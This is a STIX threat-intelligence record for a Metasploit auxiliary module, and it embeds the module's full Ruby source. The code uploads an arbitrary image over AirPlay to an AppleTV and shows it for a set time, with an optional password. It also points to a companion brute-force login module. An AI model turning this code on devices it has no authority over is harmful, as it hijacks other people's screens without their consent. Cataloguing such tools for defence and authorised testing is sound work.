{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a62fd17c-f7b6-46fe-ade0-1f1870ccb215",
    "created": "2024-08-14T16:24:15.195527Z",
    "modified": "2024-08-14T16:24:15.195531Z",
    "name": "Apple TV Image Remote Control",
    "description": "( This module will show an image on an AppleTV device for a period of time. Some AppleTV devices are actually password-protected, in that case please set the PASSWORD datastore option. For password brute forcing, please see the module auxiliary/scanner/http/appletv_login. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/appletv/appletv_display_image.rb",
            "external_id": "appletv_display_image.rb"
        },
        {
            "source_name": "reference",
            "url": "http://nto.github.io/AirPlay.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple TV Image Remote Control',\n      'Description'    => %q(\n        This module will show an image on an AppleTV device for a period of time.\n        Some AppleTV devices are actually password-protected, in that case please\n        set the PASSWORD datastore option. For password brute forcing, please see\n        the module auxiliary/scanner/http/appletv_login.\n      ),\n      'Author'         =>\n        [\n          '0a29406d9794e4f9b30b3c5d6702c708', # Original work\n          'sinn3r'                            # You can blame me for mistakes\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://nto.github.io/AirPlay.html']\n        ],\n      'DefaultOptions' => { 'HttpUsername' => 'AirPlay' },\n      'License'        => MSF_LICENSE\n    ))\n\n    # Make the PASSWORD option more visible and hope the user is more aware of this option\n    register_options([\n      Opt::RPORT(7000),\n      OptInt.new('TIME', [true, 'Time in seconds to show the image', 10]),\n      OptPath.new('FILE', [true, 'Image to upload and show']),\n      OptString.new('HttpPassword', [false, 'The password for AppleTV AirPlay'])\n    ])\n\n    # We're not actually using any of these against AppleTV in our Rex HTTP client init,\n    # so deregister them so we don't overwhelm the user with fake options.\n    deregister_options(\n      'HTTP::uri_encode_mode', 'HTTP::uri_full_url', 'HTTP::pad_method_uri_count',\n      'HTTP::pad_uri_version_count', 'HTTP::pad_method_uri_type', 'HTTP::pad_uri_version_type',\n      'HTTP::method_random_valid', 'HTTP::method_random_invalid', 'HTTP::method_random_case',\n      'HTTP::uri_dir_self_reference', 'HTTP::uri_dir_fake_relative', 'HTTP::uri_use_backslashes',\n      'HTTP::pad_fake_headers', 'HTTP::pad_fake_headers_count', 'HTTP::pad_get_params',\n      'HTTP::pad_get_params_count', 'HTTP::pad_post_params', 'HTTP::pad_post_params_count',\n      'HTTP::uri_fake_end', 'HTTP::uri_fake_params_start', 'HTTP::header_folding',\n      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2', 'NTLM::SendLM', 'NTLM::SendNTLM',\n      'NTLM::SendSPN', 'NTLM::UseLMKey', 'DOMAIN', 'DigestAuthIIS', 'VHOST'\n    )\n  end\n\n\n  #\n  # Sends an image request to AppleTV. HttpClient isn't used because we actually need to keep\n  # the connection alive so that the video can keep playing.\n  #\n  def send_image_request(opts)\n    http = nil\n\n    http = Rex::Proto::Http::Client.new(\n      rhost,\n      rport.to_i,\n      {\n        'Msf' => framework,\n        'MsfExploit' => self\n      },\n      ssl,\n      ssl_version,\n      proxies,\n      datastore['HttpUsername'],\n      datastore['HttpPassword']\n    )\n    add_socket(http)\n\n    http.set_config('agent' => datastore['UserAgent'])\n\n    req = http.request_raw(opts)\n    res = http.send_recv(req)\n\n    Rex.sleep(datastore['TIME']) if res.code == 200\n    http.close\n\n    res\n  end\n\n\n  def get_image_data\n    File.open(datastore['FILE'], 'rb') { |f| f.read(f.stat.size) }\n  end\n\n\n  def show_image\n    image = get_image_data\n\n    opts = {\n      'method'  => 'PUT',\n      'uri'     => '/photo',\n      'data'    => image\n    }\n\n    res = send_image_request(opts)\n\n    if !res\n      print_status(\"The connection timed out\")\n    elsif res.code == 200\n      print_status(\"Received HTTP 200\")\n    else\n      print_error(\"The request failed due to an unknown reason\")\n    end\n  end\n\n\n  def run\n    print_status(\"Image request sent. Duration set: #{datastore['TIME']} seconds\")\n    show_image\n  end\nend\n"
}